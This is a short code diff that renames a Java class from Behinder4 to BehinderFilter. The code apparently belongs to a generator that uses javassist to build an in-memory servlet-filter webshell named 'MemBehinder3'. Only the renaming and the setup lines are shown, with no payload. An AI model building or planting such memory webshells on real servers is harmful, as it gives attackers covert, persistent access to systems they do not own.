@@ -8,7 +8,7 @@ import javax.servlet.jsp.PageContext;
 import java.math.BigInteger;
 import java.security.MessageDigest;
 
-public class Behinder4 {
+public class BehinderFilter {
 
 
 
@@ -18,7 +18,7 @@ public class Behinder4 {
         classPool.insertClassPath(new ClassClassPath(Filter.class));
         classPool.insertClassPath(new ClassClassPath(RequestInfo.class));
         classPool.insertClassPath(new ClassClassPath(PageContext.class));
-        classPool.insertClassPath(new ClassClassPath(Behinder4.class));
+        classPool.insertClassPath(new ClassClassPath(BehinderFilter.class));
 
         String cname = "MemBehinder3"+ System.nanoTime();
         CtClass ctClass = classPool.makeClass(cname);
